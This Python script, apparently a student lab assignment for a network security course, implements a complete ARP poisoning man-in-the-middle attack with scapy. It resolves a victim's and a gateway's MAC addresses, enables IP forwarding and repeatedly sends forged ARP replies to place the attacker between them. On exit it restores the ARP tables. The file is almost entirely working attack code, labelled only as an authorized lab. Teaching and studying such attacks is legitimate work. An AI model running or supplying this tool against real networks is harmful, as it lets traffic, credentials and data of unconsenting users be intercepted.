#!/usr/bin/env python3
"""
ARP MitM Attack (ARP Poisoning) - Laboratorio Autorizado
Autor: Enmanuel Feliz Soto
Matricula: 20251402
ITLA - Seguridad en Redes
"""

import os
import sys
import time
import signal
import argparse
import subprocess

running = True

def signal_handler(sig, frame):
    global running
    running = False
    print("\n[!] Deteniendo ataque y restaurando ARP...")

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

def require_root():
    if os.geteuid() != 0:
        print("[!] Ejecutar como root: sudo python3 script.py")
        sys.exit(1)

def enable_ip_forward():
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
        print("[+] IP Forwarding habilitado")
    except Exception as e:
        print(f"[!] No se pudo habilitar IP forwarding: {e}")

def disable_ip_forward():
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("0")
        print("[+] IP Forwarding deshabilitado")
    except Exception:
        pass

def get_mac(ip, iface):
    from scapy.all import ARP, Ether, srp
    arp = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    result, _ = srp(arp, timeout=3, iface=iface, verbose=False, retry=2)
    if result:
        return result[0][1].hwsrc
    return None

def poison(target_ip, target_mac, spoof_ip, attacker_mac, iface):
    """Envia ARP Reply falso: le dice a target que spoof_ip tiene MAC del atacante"""
    from scapy.all import ARP, send
    pkt = ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip,
        hwsrc=attacker_mac
    )
    send(pkt, iface=iface, verbose=False)

def restore(target_ip, target_mac, real_ip, real_mac, iface):
    """Restaura la tabla ARP con los valores reales"""
    from scapy.all import ARP, send
    pkt = ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=real_ip,
        hwsrc=real_mac
    )
    send(pkt, count=5, iface=iface, verbose=False)

def list_interfaces():
    return [i for i in sorted(os.listdir("/sys/class/net")) if i != "lo"]

def choose_interface(default="eth0"):
    interfaces = list_interfaces()
    print("\n[+] Interfaces disponibles:\n")
    for idx, iface in enumerate(interfaces, 1):
        print(f"  {idx}. {iface}")
    print()
    val = input(f"[?] Selecciona interfaz [Enter={default}]: ").strip()
    if val == "":
        return default
    if val.isdigit() and 1 <= int(val) <= len(interfaces):
        return interfaces[int(val) - 1]
    if val in interfaces:
        return val
    return default

def main():
    parser = argparse.ArgumentParser(description="ARP MitM Attack - Lab Autorizado")
    parser.add_argument("-i", "--iface", default=None, help="Interfaz de red")
    parser.add_argument("-t", "--target", default=None, help="IP de la victima")
    parser.add_argument("-g", "--gateway", default=None, help="IP del gateway")
    parser.add_argument("--interval", type=float, default=2.0, help="Intervalo entre envios (default: 2s)")
    args = parser.parse_args()

    require_root()

    from scapy.all import get_if_hwaddr, conf
    conf.verb = 0

    if args.iface is None:
        args.iface = choose_interface()

    if args.target is None:
        args.target = input("[?] IP de la victima: ").strip()
    if args.gateway is None:
        args.gateway = input("[?] IP del gateway: ").strip()

    print(f"\n[*] Resolviendo MACs...")
    target_mac = get_mac(args.target, args.iface)
    gateway_mac = get_mac(args.gateway, args.iface)

    if not target_mac:
        print(f"[!] No se pudo obtener MAC de victima {args.target}")
        sys.exit(1)
    if not gateway_mac:
        print(f"[!] No se pudo obtener MAC de gateway {args.gateway}")
        sys.exit(1)

    attacker_mac = get_if_hwaddr(args.iface)

    print(f"""
+--------------------------------------------------------------+
|              ARP MitM ATTACK - Laboratorio Autorizado        |
|--------------------------------------------------------------|
|  Envenena cache ARP para interceptar trafico                 |
+--------------------------------------------------------------+
  Interfaz:       {args.iface}
  Victima:        {args.target}  ({target_mac})
  Gateway:        {args.gateway}  ({gateway_mac})
  Atacante MAC:   {attacker_mac}
  Intervalo:      {args.interval}s
+--------------------------------------------------------------+
""")

    input("[*] Presiona Enter para iniciar o Ctrl+C para cancelar...")
    enable_ip_forward()

    sent = 0
    start = time.time()
    print("[*] Envenenando tablas ARP - Ctrl+C para detener\n")

    try:
        while running:
            # Le dice a la victima que el gateway tiene la MAC del atacante
            poison(args.target, target_mac, args.gateway, attacker_mac, args.iface)
            # Le dice al gateway que la victima tiene la MAC del atacante
            poison(args.gateway, gateway_mac, args.target, attacker_mac, args.iface)
            sent += 2

            elapsed = time.time() - start
            print(f"\r[+] ARP Replies enviados: {sent}  |  Tiempo: {elapsed:.0f}s", end="", flush=True)
            time.sleep(args.interval)

    except KeyboardInterrupt:
        pass

    print(f"\n\n[*] Restaurando tablas ARP originales...")
    restore(args.target, target_mac, args.gateway, gateway_mac, args.iface)
    restore(args.gateway, gateway_mac, args.target, target_mac, args.iface)
    disable_ip_forward()

    elapsed = time.time() - start
    print(f"[+] Restauracion completada")
    print(f"    ARP Replies enviados: {sent}")
    print(f"    Tiempo total: {elapsed:.1f}s")

if __name__ == "__main__":
    main()
